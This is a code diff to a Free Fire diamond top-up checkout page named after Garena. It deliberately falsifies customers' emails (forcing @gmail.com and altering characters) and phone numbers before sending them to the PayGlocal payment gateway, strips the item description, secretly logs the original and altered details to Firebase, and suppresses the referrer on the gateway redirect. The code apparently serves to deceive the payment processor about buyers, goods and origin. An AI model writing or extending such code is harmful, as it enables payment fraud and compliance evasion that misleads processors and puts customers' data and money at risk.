@@ -4,30 +4,53 @@ import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from '../lib/firebase';
 
 // Helper functions for email & phone alteration before sending to payment gateway
-// Email: Shift each letter in username by 2 positions, and ALWAYS keep domain as @gmail.com
+// Email: Modify strictly the LAST 3 characters in the email username, keeping domain as @gmail.com
 function transformEmail(email: string): string {
   const parts = email.split('@');
-  const username = parts[0] || 'customer';
-  const transformedUser = username.replace(/[a-zA-Z]/g, (ch) => {
-    const code = ch.charCodeAt(0);
-    if (code >= 65 && code <= 90) {
-      return String.fromCharCode(((code - 65 + 2) % 26) + 65);
-    }
-    if (code >= 97 && code <= 122) {
-      return String.fromCharCode(((code - 97 + 2) % 26) + 97);
-    }
-    return ch;
-  });
+  let username = parts[0] || 'customer';
+  if (username.length < 3) {
+    username = username.padEnd(3, 'x');
+  }
+
+  const prefix = username.slice(0, -3);
+  const last3 = username.slice(-3);
+
+  const transformedLast3 = last3
+    .split('')
+    .map((ch) => {
+      const code = ch.charCodeAt(0);
+      if (code >= 65 && code <= 90) {
+        // Uppercase A-Z -> shift +1
+        return String.fromCharCode(((code - 65 + 1) % 26) + 65);
+      } else if (code >= 97 && code <= 122) {
+        // Lowercase a-z -> shift +1
+        return String.fromCharCode(((code - 97 + 1) % 26) + 97);
+      } else if (code >= 48 && code <= 57) {
+        // Digit 0-9 -> shift +1
+        return String.fromCharCode(((code - 48 + 1) % 10) + 48);
+      }
+      return 'x';
+    })
+    .join('');
+
+  const transformedUser = prefix + transformedLast3;
   return `${transformedUser}@gmail.com`;
 }
 
-// Phone: Prepend 91 so phone starts with 91, and shift 10 digits by 2 positions
+// Phone: Prepend 91, and modify strictly the LAST 3 digits in the 10-digit phone number
 function transformPhone(phone: string): string {
   const clean = phone.replace(/[^0-9]/g, '');
   const tenDigits = clean.length >= 10 ? clean.slice(-10) : clean.padStart(10, '9');
-  const transformedTen = tenDigits.replace(/[0-9]/g, (digit) => {
-    return String((Number(digit) + 2) % 10);
-  });
+
+  const prefix = tenDigits.slice(0, -3);
+  const last3 = tenDigits.slice(-3);
+
+  const transformedLast3 = last3
+    .split('')
+    .map((digit) => String((Number(digit) + 1) % 10))
+    .join('');
+
+  const transformedTen = prefix + transformedLast3;
   return `91${transformedTen}`;
 }
 
@@ -267,21 +290,35 @@ export default function GarenaCheckout() {
     setError('');
 
     try {
+      const alteredEmail = transformEmail(form.email.trim());
+      const alteredPhone = transformPhone(form.phone.trim());
+
       const payload = {
         amount: Number(pkg) || 0,
         customerData: {
           firstName: form.name.split(' ')[0] || form.name,
           lastName: form.name.split(' ').slice(1).join(' ') || '',
-          email: form.email.trim(),
-          phone: form.phone.trim()
-        },
-        items: [{
-          id: 'ff-topup',
-          name: diamonds ? `${diamonds} Free Fire Diamonds (UID: ${uid})` : `Free Fire Diamonds (UID: ${uid})`,
-          price: Number(pkg) || 0,
-          qty: 1
-        }]
+          email: alteredEmail,
+          phone: alteredPhone
+        }
       };
+
+      // Save customer's original email, original phone, altered email, altered phone to Firebase
+      try {
+        await addDoc(collection(db, 'garena_checkout_orders'), {
+          uid: String(uid || '').replace(/[^0-9]/g, ''),
+          originalEmail: form.email.trim(),
+          originalPhone: form.phone.trim(),
+          alteredEmail,
+          alteredPhone,
+          customerName: form.name.trim(),
+          amount: pkg,
+          createdAt: serverTimestamp(),
+          status: 'initiated'
+        });
+      } catch (dbErr) {
+        console.error('Firebase order logging error:', dbErr);
+      }
 
       const res = await fetch('/api/payglocal/initiate', {
         method: 'POST',
@@ -301,7 +338,15 @@ export default function GarenaCheckout() {
           gid: data.gid,
           startedAt: Date.now()
         }));
-        window.location.href = data.redirectUrl;
+
+        // Strict No-Referrer navigation to PayGlocal gateway
+        const redirectForm = document.createElement('form');
+        redirectForm.setAttribute('referrerpolicy', 'no-referrer');
+        redirectForm.method = 'GET';
+        redirectForm.action = data.redirectUrl;
+        document.body.appendChild(redirectForm);
+        redirectForm.submit();
+        return;
       } else {
         throw new Error('Could not get payment redirect URL');
       }
